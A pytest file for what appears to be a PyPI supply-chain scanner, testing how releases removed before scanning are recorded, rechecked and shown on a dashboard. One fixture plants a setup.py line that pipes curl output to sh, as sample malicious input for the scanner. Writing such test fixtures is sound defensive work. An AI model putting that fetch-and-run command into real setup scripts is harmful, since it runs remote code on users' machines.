"""PR E part 2 (npm #39 port): a release PyPI no longer serves is recorded as removed_before_scan, silently."""
import dataclasses, json, logging, time

import pytest

from pydiffwatch import dashboard, fetcher, ingest, orchestrator, store
from pydiffwatch.config import Config
from pydiffwatch.models import ArtifactSet, NewRelease


# ---- fetcher ----
import urllib.error


def _json_404(monkeypatch):
    def raise_404(p, cfg):
        raise urllib.error.HTTPError("https://pypi.org/pypi/x/json", 404, "Not Found", {}, None)
    monkeypatch.setattr(fetcher, "_package_json", raise_404)


def _json(monkeypatch, releases):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: {"info": {}, "releases": releases})


def test_a_404_is_project_gone(monkeypatch):
    _json_404(monkeypatch)
    assert fetcher.download(Config(), NewRelease("p", "1.0", 1)) == fetcher.Removed("project_gone", None)


def test_a_json_without_the_version_is_version_gone(monkeypatch):
    _json(monkeypatch, {"0.9": [{"packagetype": "sdist", "url": "mock://p/0.9"}]})
    assert fetcher.download(Config(), NewRelease("p", "1.0", 1)) == fetcher.Removed("version_gone", None)


def test_the_changelog_time_is_carried(monkeypatch):
    _json_404(monkeypatch)
    rel = NewRelease("p", "1.0", 1, removed_at="2026-09-27T10:00:00+00:00")
    assert fetcher.download(Config(), rel).at == "2026-09-27T10:00:00+00:00"


@pytest.mark.parametrize("files", [[{"packagetype": "bdist_wheel", "url": "mock://p/1.0.whl"}], []])
def test_a_present_version_without_an_sdist_is_still_no_sdist(monkeypatch, files):
    _json(monkeypatch, {"1.0": files})
    assert isinstance(fetcher.download(Config(), NewRelease("p", "1.0", 1)), fetcher.NoSdist)


def test_a_quarantined_package_is_refused_before_any_json(monkeypatch):
    from pydiffwatch import quarantine
    monkeypatch.setattr(quarantine, "is_quarantined", lambda name: True)
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: pytest.fail("fetched JSON"))
    with pytest.raises(fetcher.RefusedToFetch):
        fetcher.download(Config(), NewRelease("p", "1.0", 1))


# ---- store ----

def _cfg(tmp_path, **kw):
    return Config(**{**dict(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l",
                            reviewer_enabled=False), **kw})


def _conn(cfg):
    conn = store.connect(cfg); store.init_schema(conn)
    return conn


def test_record_removed_and_counts(tmp_path):
    conn = _conn(_cfg(tmp_path))
    for i, kind in enumerate(("project_gone", "project_gone", "version_gone")):
        rid = store.record_release(conn, f"p{i}", "1.0", i, False, None, "sdist")
        store.record_removed(conn, rid, kind, None)
    assert store.removed_counts(conn) == {"project_gone": 2, "version_gone": 1}


def test_set_recheck_at_leaves_the_stage(tmp_path):
    conn = _conn(_cfg(tmp_path))
    rid = store.record_release(conn, "p", "1.0", 1, False, None, "sdist")
    store.update_stage(conn, rid, "pending_review")
    store.set_recheck_at(conn, rid, 123.0)
    assert store.recheck_at(conn, rid) == 123.0 and store.get_stage(conn, "p", "1.0") == "pending_review"


def test_the_migration_moves_metadata_gone_and_keeps_its_alert(tmp_path):
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    rid = store.record_release(conn, "gone", "1.0", 1, False, None, "sdist")
    store.update_stage(conn, rid, "metadata_gone")
    store.record_alert(conn, rid, "suspicious-heuristic", 0.0, "[]",
                       "gone|1.0|suspicious-heuristic|unscanned:metadata_gone")
    conn.execute("DELETE FROM meta WHERE key='removed_before_scan'"); conn.commit()
    store.init_schema(conn)
    row = conn.execute("SELECT stage, removed_reason, removed_at FROM releases WHERE id=?", (rid,)).fetchone()
    assert tuple(row) == ("removed_before_scan", "project_gone", None)
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 1


def test_the_migration_runs_once_and_on_a_fresh_db(tmp_path):
    # Review Focus 5
    conn = _conn(_cfg(tmp_path))
    assert conn.execute("SELECT 1 FROM meta WHERE key='removed_before_scan'").fetchone() is not None
    rid = store.record_release(conn, "later", "1.0", 1, False, None, "sdist")
    store.update_stage(conn, rid, "metadata_gone")        # an impossible row after E: the second run leaves it
    store.init_schema(conn)
    assert store.get_stage(conn, "later", "1.0") == "metadata_gone"


# ---- recording ----

def _process(cfg, conn, rel, result):
    return orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), rel, result)


def _counts(conn):
    return (conn.execute("SELECT count(*) FROM verdicts").fetchone()[0],
            conn.execute("SELECT count(*) FROM alerts").fetchone()[0])


def test_an_evidenced_removal_is_recorded_at_once_and_silently(tmp_path, capsys):
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    rel = NewRelease("p", "1.0", 5, removed_at="2026-09-27T10:00:00+00:00")
    assert _process(cfg, conn, rel, fetcher.Removed("project_gone", rel.removed_at)) is True
    row = conn.execute("SELECT stage, removed_reason, removed_at FROM releases").fetchone()
    assert tuple(row) == ("removed_before_scan", "project_gone", "2026-09-27T10:00:00+00:00")
    assert _counts(conn) == (0, 0) and capsys.readouterr().out == ""
    assert orchestrator.list_pending(cfg) == [] and store.removed_counts(conn) == {"project_gone": 1}


@pytest.mark.parametrize("kind", ["project_gone", "version_gone"])
def test_an_unevidenced_removal_waits_one_recheck(tmp_path, caplog, kind):
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    rel = NewRelease("p", "1.0", 5)
    caplog.set_level(logging.INFO, logger="pydiffwatch.orchestrator")
    _process(cfg, conn, rel, fetcher.Removed(kind))
    assert store.get_stage(conn, "p", "1.0") == "no_sdist_wait" and _counts(conn) == (0, 0)
    assert [r.getMessage() for r in caplog.records if f"not on PyPI ({kind})" in r.getMessage()]
    _process(cfg, conn, rel, fetcher.Removed(kind))                    # before the grace: still waiting
    assert store.get_stage(conn, "p", "1.0") == "no_sdist_wait"
    conn.execute("UPDATE releases SET recheck_at=?", (time.time() - 1,)); conn.commit()
    _process(cfg, conn, rel, fetcher.Removed(kind))                    # due, still gone: recorded
    assert store.get_stage(conn, "p", "1.0") == "removed_before_scan" and _counts(conn) == (0, 0)


def test_a_release_served_again_at_the_recheck_is_scanned(tmp_path, scan_stub):
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    rel = NewRelease("p", "1.1", 5)
    _process(cfg, conn, rel, fetcher.Removed("version_gone"))
    conn.execute("UPDATE releases SET recheck_at=?", (time.time() - 1,)); conn.commit()
    art = ArtifactSet("p", "1.1", "1.0", "sdist", {"p/a.py": b"x = 2\n"}, {"p/a.py": b"x = 1\n"}, {})
    _process(cfg, conn, rel, scan_stub.dl(art))
    assert store.get_stage(conn, "p", "1.1") == "triaged"


def test_version_gone_then_wheels_only_takes_the_no_sdist_path(tmp_path):
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    rel = NewRelease("p", "1.0", 5)
    _process(cfg, conn, rel, fetcher.Removed("version_gone"))
    conn.execute("UPDATE releases SET recheck_at=?", (time.time() - 1,)); conn.commit()
    _process(cfg, conn, rel, fetcher.NoSdist())
    assert store.get_stage(conn, "p", "1.0") == "no_sdist"


def test_a_retrying_release_that_is_now_removed_waits_one_recheck(tmp_path):
    # Review Focus 4
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    rel = NewRelease("p", "1.0", 5)
    _process(cfg, conn, rel, TimeoutError("slow"))
    assert store.get_stage(conn, "p", "1.0") == "metadata_retry"
    _process(cfg, conn, rel, fetcher.Removed("project_gone"))
    assert store.get_stage(conn, "p", "1.0") == "no_sdist_wait"


def test_run_once_with_a_404_parks_then_records_and_never_pins_the_cursor(tmp_path, monkeypatch):
    cfg = _cfg(tmp_path)
    monkeypatch.setattr(ingest, "changes_since",
                        lambda cfg, since: [r for r in (NewRelease("gone", "1.0", 10), NewRelease("after", "1.0", 11))
                                            if r.serial > since])
    monkeypatch.setattr(fetcher, "download", lambda cfg, rel, attempt=1:
                        fetcher.Removed("project_gone") if rel.package == "gone" else fetcher.NoSdist())
    orchestrator.run_once(cfg, seed_if_fresh=False)
    conn = store.connect(cfg)
    assert store.get_stage(conn, "gone", "1.0") == "no_sdist_wait" and store.get_last_serial(conn) == 11
    conn.execute("UPDATE releases SET recheck_at=? WHERE package='gone'", (time.time() - 1,)); conn.commit()
    orchestrator.run_once(cfg, seed_if_fresh=False)
    assert store.get_stage(conn, "gone", "1.0") == "removed_before_scan"
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0


@pytest.mark.parametrize("entry", ["list_pending", "backfill_evidence"])
def test_the_rescan_paths_report_a_removal(tmp_path, monkeypatch, entry):
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    rid = store.record_release(conn, "p", "1.0", 1, False, None, "sdist")
    store.update_stage(conn, rid, "needs_adjudication", 50.0,
                       '[{"rule": "r", "weight": 50.0, "file": "setup.py", "lines": [1, 1]}]')   # backfill skips '[]' rows
    from pydiffwatch.models import Verdict
    store.record_verdict(conn, rid, Verdict("p", "1.0", "suspicious", 50.0, [], False, model="m", reasoning="r"))
    monkeypatch.setattr(fetcher, "download", lambda cfg, rel, attempt=1: fetcher.Removed("version_gone"))
    if entry == "list_pending":
        [item] = orchestrator.list_pending(cfg)
        assert item["fetch_error"] == "removed from PyPI (version_gone)"
    else:
        [res] = orchestrator.backfill_evidence(cfg, rid)
        assert res["captured"] is False and res["error"] == "removed from PyPI (version_gone)"


# ---- D6: the reviewer_disabled rebuild ----
from pydiffwatch import reviewer


class _Backend:
    def complete(self, *a, **k):
        raise AssertionError("no review: the release is gone")


def _queued(tmp_path, scan_stub):
    """A release queued while the reviewer was off (reviewer_disabled, no stored input)."""
    cfg = _cfg(tmp_path, reviewer_enabled=True)
    conn = _conn(cfg)
    art = ArtifactSet("p", "1.1", "1.0", "sdist", {"setup.py": b"import os\nos.system('curl x | sh')\n"},
                      {"setup.py": b"x = 1\n"}, {})
    orchestrator._process_fetched(dataclasses.replace(cfg, reviewer_enabled=False), conn, None,
                                  orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), scan_stub.dl(art))
    assert store.pending_review_counts(conn) == {"reviewer_disabled": 1}
    return cfg, conn


def _drain(cfg, conn, monkeypatch):
    monkeypatch.setattr(fetcher, "download", lambda cfg, rel, attempt=1: fetcher.Removed("version_gone"))
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()), auto=True)


def _row(conn):
    return conn.execute("SELECT stage, pending_reason, pending_detail, review_attempts, recheck_at, triage_score, "
                        "removed_reason FROM releases WHERE package='p'").fetchone()


def test_a_queued_release_that_is_gone_waits_then_is_recorded(tmp_path, scan_stub, monkeypatch):
    cfg, conn = _queued(tmp_path, scan_stub)
    score = _row(conn)["triage_score"]
    _drain(cfg, conn, monkeypatch)
    r = _row(conn)
    assert (r["stage"], r["pending_reason"], r["review_attempts"]) == ("pending_review", "reviewer_disabled", 0)
    assert r["pending_detail"].startswith("not on PyPI (version_gone)") and r["recheck_at"] > time.time()
    assert _counts(conn) == (0, 0)
    first = r["recheck_at"]
    _drain(cfg, conn, monkeypatch)                                     # before the grace: unchanged
    assert (_row(conn)["recheck_at"], _row(conn)["review_attempts"]) == (first, 0)
    conn.execute("UPDATE releases SET recheck_at=?", (time.time() - 1,)); conn.commit()
    _drain(cfg, conn, monkeypatch)                                     # due, still gone: recorded
    r = _row(conn)
    assert (r["stage"], r["removed_reason"], r["triage_score"]) == ("removed_before_scan", "version_gone", score)
    assert _counts(conn) == (0, 0) and store.pending_review_counts(conn) == {}
    assert store.removed_counts(conn) == {"version_gone": 1}


def test_a_stale_recheck_time_does_not_skip_the_first_wait(tmp_path, scan_stub, monkeypatch):
    cfg, conn = _queued(tmp_path, scan_stub)
    conn.execute("UPDATE releases SET recheck_at=?", (time.time() - 1000,)); conn.commit()   # from an old wait
    _drain(cfg, conn, monkeypatch)
    assert _row(conn)["stage"] == "pending_review"                    # the detail prefix decides, not recheck_at


# ---- dashboard ----

def test_the_strip_counts_removals():
    html = dashboard.render_dashboard([], status={"removed": {"project_gone": 2, "version_gone": 1}})
    assert "3 removed before scan (project gone: 2, version gone: 1)" in html


def test_the_export_carries_the_counts(tmp_path):
    cfg = _cfg(tmp_path)
    conn = _conn(cfg)
    rid = store.record_release(conn, "p", "1.0", 1, False, None, "sdist")
    store.record_removed(conn, rid, "version_gone", None)
    assert "1 removed before scan (version gone: 1)" in orchestrator.export_dashboard(cfg).read_text()


def test_a_recorded_removal_is_not_counted_as_reviewed(tmp_path, scan_stub, monkeypatch):
    # final review I2: the drain's count feeds "reviewed N queued release(s)"; no model saw a removed release
    cfg, conn = _queued(tmp_path, scan_stub)
    _drain(cfg, conn, monkeypatch)
    conn.execute("UPDATE releases SET recheck_at=?", (time.time() - 1,)); conn.commit()
    monkeypatch.setattr(fetcher, "download", lambda cfg, rel, attempt=1: fetcher.Removed("version_gone"))
    done = orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()), auto=True)
    assert _row(conn)["stage"] == "removed_before_scan" and done == 0
